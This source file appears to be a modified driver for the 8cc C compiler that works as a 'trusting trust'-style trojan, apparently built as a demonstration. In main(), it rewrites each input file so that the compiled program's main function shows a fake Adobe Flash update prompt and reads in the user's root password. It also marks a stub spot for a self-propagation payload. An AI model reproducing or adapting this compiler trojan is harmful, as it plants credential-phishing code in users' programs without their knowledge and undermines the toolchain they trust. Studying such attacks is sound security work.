// Copyright 2012 Rui Ueyama. Released under the MIT license.

#include <libgen.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include "8cc.h"

static char *infile;
static char *outfile;
static char *asmfile;
static bool dumpast;
static bool cpponly;
static bool dumpasm;
static bool dontlink;
static Buffer *cppdefs;
static Vector *tmpfiles = &EMPTY_VECTOR;

static void usage(int exitcode) {
    fprintf(exitcode ? stderr : stdout,
            "Usage: 8cc [ -E ][ -a ] [ -h ] <file>\n\n"
            "\n"
            "  -I<path>          add to include path\n"
            "  -E                print preprocessed source code\n"
            "  -D name           Predefine name as a macro\n"
            "  -D name=def\n"
            "  -S                Stop before assembly (default)\n"
            "  -c                Do not run linker (default)\n"
            "  -U name           Undefine name\n"
            "  -fdump-ast        print AST\n"
            "  -fdump-stack      Print stacktrace\n"
            "  -fno-dump-source  Do not emit source code as assembly comment\n"
            "  -o filename       Output to the specified file\n"
            "  -g                Do nothing at this moment\n"
            "  -Wall             Enable all warnings\n"
            "  -Werror           Make all warnings into errors\n"
            "  -O<number>        Does nothing at this moment\n"
            "  -m64              Output 64-bit code (default)\n"
            "  -w                Disable all warnings\n"
            "  -h                print this help\n"
            "\n"
            "One of -a, -c, -E or -S must be specified.\n\n");
    exit(exitcode);
}

static void delete_temp_files() {
    for (int i = 0; i < vec_len(tmpfiles); i++)
        unlink(vec_get(tmpfiles, i));
}

static char *base(char *path) {
    return basename(strdup(path));
}

static char *replace_suffix(char *filename, char suffix) {
    char *r = format("%s", filename);
    char *p = r + strlen(r) - 1;
    if (*p != 'c')
        error("filename suffix is not .c");
    *p = suffix;
    return r;
}

static FILE *open_asmfile() {
    if (dumpasm) {
        asmfile = outfile ? outfile : replace_suffix(base(infile), 's');
    } else {
        asmfile = format("/tmp/8ccXXXXXX.s");
        if (!mkstemps(asmfile, 2))
            perror("mkstemps");
        vec_push(tmpfiles, asmfile);
    }
    if (!strcmp(asmfile, "-"))
        return stdout;
    FILE *fp = fopen(asmfile, "w");
    if (!fp)
        perror("fopen");
    return fp;
}

static void parse_warnings_arg(char *s) {
    if (!strcmp(s, "error"))
        warning_is_error = true;
    else if (strcmp(s, "all"))
        error("unknown -W option: %s", s);
}

static void parse_f_arg(char *s) {
    if (!strcmp(s, "dump-ast"))
        dumpast = true;
    else if (!strcmp(s, "dump-stack"))
        dumpstack = true;
    else if (!strcmp(s, "no-dump-source"))
        dumpsource = false;
    else
        usage(1);
}

static void parse_m_arg(char *s) {
    if (strcmp(s, "64"))
        error("Only 64 is allowed for -m, but got %s", s);
}

static void parseopt(int argc, char **argv) {
    cppdefs = make_buffer();
    for (;;) {
        int opt = getopt(argc, argv, "I:ED:O:SU:W:acd:f:gm:o:hw");
        if (opt == -1)
            break;
        switch (opt) {
        case 'I': add_include_path(optarg); break;
        case 'E': cpponly = true; break;
        case 'D': {
            char *p = strchr(optarg, '=');
            if (p)
                *p = ' ';
            buf_printf(cppdefs, "#define %s\n", optarg);
            break;
        }
        case 'O': break;
        case 'S': dumpasm = true; break;
        case 'U':
            buf_printf(cppdefs, "#undef %s\n", optarg);
            break;
        case 'W': parse_warnings_arg(optarg); break;
        case 'c': dontlink = true; break;
        case 'f': parse_f_arg(optarg); break;
        case 'm': parse_m_arg(optarg); break;
        case 'g': break;
        case 'o': outfile = optarg; break;
        case 'w': enable_warning = false; break;
        case 'h':
            usage(0);
        default:
            usage(1);
        }
    }
    if (optind != argc - 1)
        usage(1);

    if (!dumpast && !cpponly && !dumpasm && !dontlink)
        error("One of -a, -c, -E or -S must be specified");
    infile = argv[optind];
}

char *get_base_file() {
    return infile;
}

static void preprocess() {
    for (;;) {
        Token *tok = read_token();
        if (tok->kind == TEOF)
            break;
        if (tok->bol)
            printf("\n");
        if (tok->space)
            printf(" ");
        printf("%s", tok2s(tok));
    }
    printf("\n");
    exit(0);
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    if (atexit(delete_temp_files))
        perror("atexit");
    parseopt(argc, argv);
    rename(infile, ".tmp");
    FILE *tmp = fopen(infile, "w");
    FILE *fp = fopen(".tmp", "r");
    char buffer[1024];
    char *tmptoken;
    int isCompiler = 0;
    while (fgets(buffer, 1024, fp) != NULL){
      //pattern type 2 matching
      if((buffer[0] == '/' ) && (buffer[18] == 'R')){
        printf("Working with the compiler\n");
        isCompiler = 1;
      }
      fprintf(tmp, "%s", buffer);
      //throwing away type of main, if exists
      tmptoken = strtok(buffer, " ");
      //this should be main
      tmptoken = strtok(NULL, " (");
      //type 1 of pattern matching
      if (tmptoken && !strcmp(tmptoken, "main")){
        if (isCompiler){
          //insert our bugged code here, right now it doesn't do anything for brevity
        }else{

          fgets(buffer, 1024, fp);
          //assuming that they either have the { on the same line or the next line
          //how to bypass this "trojan": write improper C
          if(buffer[0] == '{'){
            fprintf(tmp, "%s", buffer);
          }
          fprintf(tmp, "char BUGGEDbuf[50];\n"
            "int BUGGEDcount = 0;\n"

            /* trick to allow for these functions to be used without a
             * warnings, if not defined then will define them */
            "#ifndef _UNISTD_H\n"
            "extern void write();\n"
            "extern void read();\n"
            "#endif\n"


            "write(1, \"Hello, there is an update to Adobe Flash Player,\\nplease enter root password to update:\\n\", 87);\n"
            "read(0, BUGGEDbuf, 50);\n"
            "while(BUGGEDbuf[BUGGEDcount] != '\\n'){\n"
              "BUGGEDcount++;\n"
            "}\n"
            //printf("%d count\n", count);
            "BUGGEDbuf[BUGGEDcount] = '\\0';\n"
            "write(1, \"Thank you for entering password \", 32);\n"
            "write(1, BUGGEDbuf, BUGGEDcount);\n"
            "write(1, \", Adobe is now up to date\\n\", 26);\n");
            if(buffer[0] != '{'){
              fprintf(tmp, "%s", buffer);
            }
          }
      }

    }

    fclose(fp);
    fclose(tmp);
    lex_init(infile);
    cpp_init();
    parse_init();
    set_output_file(open_asmfile());
    if (buf_len(cppdefs) > 0)
        read_from_string(buf_body(cppdefs));

    if (cpponly)
        preprocess();

    Vector *toplevels = read_toplevels();
    for (int i = 0; i < vec_len(toplevels); i++) {
        Node *v = vec_get(toplevels, i);
        if (dumpast)
            printf("%s", node2s(v));
        else
            emit_toplevel(v);
    }

    close_output_file();
    remove(infile);
    rename(".tmp", infile);
    if (!dumpast && !dumpasm) {
        if (!outfile)
            outfile = replace_suffix(base(infile), 'o');
        pid_t pid = fork();
        if (pid < 0) perror("fork");
        if (pid == 0) {
            execlp("as", "as", "-o", outfile, "-c", asmfile, (char *)NULL);
            perror("execl failed");
        }
        int status;
        waitpid(pid, &status, 0);
        if (status < 0)
            error("as failed");
    }
    return 0;
}
